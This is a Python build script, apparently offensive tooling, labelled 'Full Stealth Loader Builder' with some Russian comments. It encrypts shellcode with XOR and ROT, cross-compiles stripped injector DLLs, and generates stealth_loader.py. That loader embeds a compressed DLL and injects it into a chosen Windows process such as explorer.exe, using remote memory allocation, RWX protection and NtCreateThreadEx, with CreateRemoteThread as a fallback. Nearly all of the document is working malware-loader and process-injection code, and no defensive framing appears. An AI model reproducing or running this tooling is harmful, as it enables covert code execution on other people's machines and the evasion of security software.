import os
import subprocess
import zlib
import sys

# ====================== НАСТРОЙКИ ПО УМОЛЧАНИЮ ======================
DEFAULT_XOR_KEY = 0x9F
DEFAULT_ROT_VALUE = 5
# =================================================================

def run_command(cmd):
    print(f"[+] Running: {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[-] Error: {result.stderr.strip()}")
        return False
    return True

def main():
    if len(sys.argv) >= 3:
        try:
            XOR_KEY = int(sys.argv[1], 16)
            ROT_VALUE = int(sys.argv[2])
        except:
            print("[-] Invalid arguments. Using defaults.")
            XOR_KEY = DEFAULT_XOR_KEY
            ROT_VALUE = DEFAULT_ROT_VALUE
    else:
        XOR_KEY = DEFAULT_XOR_KEY
        ROT_VALUE = DEFAULT_ROT_VALUE

    print("================================================")
    print("     Full Stealth Loader Builder")
    print("================================================")
    print(f"[+] XOR_KEY   = 0x{XOR_KEY:02X}")
    print(f"[+] ROT_VALUE = {ROT_VALUE}")

    print("[+] Generating encrypted shellcode...")

    # 1. Шифруем shellcode
    run_command(f"python3 encrypt_shellcode.py {XOR_KEY} {ROT_VALUE} > encrypted_payload.h")

    # 2. Сборка
    print("[+] Building helper.dll...")
    run_command('x86_64-w64-mingw32-gcc -shared -o helper.dll helper.c -Wl,--subsystem,windows -s -O2')
    run_command('strip helper.dll')

    print("[+] Converting helper.dll to C array...")
    run_command("python3 bin2c.py helper.dll > helper_data.h")

    print("[+] Building stealth_injector.dll...")
    run_command('x86_64-w64-mingw32-gcc -shared -o stealth_injector.dll stealth_injector.c -Wl,--subsystem,windows -s -O2 -fno-stack-protector')
    run_command('strip stealth_injector.dll')

    # 3. Создаём финальный one-file loader
    print("[+] Embedding DLL into stealth_loader.py...")
    with open("stealth_injector.dll", "rb") as f:
        dll_data = f.read()

    compressed = zlib.compress(dll_data, level=9)

    with open("stealth_loader.py", "w", encoding="utf-8") as f:
        f.write(f'''import ctypes
import sys
import struct
import zlib

# ====================== CONFIG ======================
XOR_KEY = 0x{XOR_KEY:02X}
ROT_VALUE = {ROT_VALUE}
# ===================================================

if sys.platform != "win32":
    print("[-] This script works only on Windows")
    sys.exit(1)

kernel32 = ctypes.windll.kernel32

COMPRESSED_DLL = {repr(compressed)}

def get_dll_bytes():
    return zlib.decompress(COMPRESSED_DLL)

''')
        # Добавляем остальной код
        f.write('''class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
        ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
        ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260),
    ]

def reflective_inject(pid: int, dll_bytes: bytes):
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll

    h_process = kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not h_process:
        raise ctypes.WinError()

    try:
        dll_size = len(dll_bytes)
        remote_base = kernel32.VirtualAllocEx(h_process, None, dll_size, 0x3000, 0x04)
        if not remote_base:
            raise ctypes.WinError()

        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_base, dll_bytes, dll_size, ctypes.byref(written))

        e_lfanew = struct.unpack_from("<I", dll_bytes, 0x3C)[0]
        entry_rva = struct.unpack_from("<I", dll_bytes, e_lfanew + 0x28)[0]
        entry_point = remote_base + entry_rva

        old = ctypes.c_ulong(0)
        kernel32.VirtualProtectEx(h_process, remote_base, dll_size, 0x40, ctypes.byref(old))

        h_thread = ctypes.c_void_p(0)
        status = ntdll.NtCreateThreadEx(ctypes.byref(h_thread), 0x1FFFFF, None, h_process, entry_point, remote_base, 0, 0, 0, 0, None)

        if status == 0:
            print(f"[+] Successfully injected into PID {pid}")
            kernel32.WaitForSingleObject(h_thread, 15000)
        else:
            print("[-] NtCreateThreadEx failed, using fallback...")
            kernel32.CreateRemoteThread(h_process, None, 0, entry_point, remote_base, 0, None)
    finally:
        kernel32.CloseHandle(h_process)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python stealth_loader.py <target_process>")
        print("Example: python stealth_loader.py explorer.exe")
        sys.exit(1)

    target = sys.argv[1]
    try:
        dll_bytes = get_dll_bytes()
        print(f"[+] Loaded embedded DLL: {len(dll_bytes)} bytes")

        snapshot = kernel32.CreateToolhelp32Snapshot(0x00000002, 0)
        pe = PROCESSENTRY32()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)

        found = False
        if kernel32.Process32First(snapshot, ctypes.byref(pe)):
            while True:
                if pe.szExeFile.decode('utf-8', errors='ignore').lower() == target.lower():
                    print(f"[+] Injecting into {target} (PID: {pe.th32ProcessID})")
                    reflective_inject(pe.th32ProcessID, dll_bytes)
                    found = True
                    break
                if not kernel32.Process32Next(snapshot, ctypes.byref(pe)):
                    break
        if not found:
            print(f"[-] Process '{target}' not found!")
    except Exception as e:
        print(f"[-] Error: {e}")
''')

    print("\n[+] Build completed successfully!")
    print(f"[+] Final file: **stealth_loader.py**")
    print(f"[+] Usage: python stealth_loader.py explorer.exe")

if __name__ == "__main__":
    main()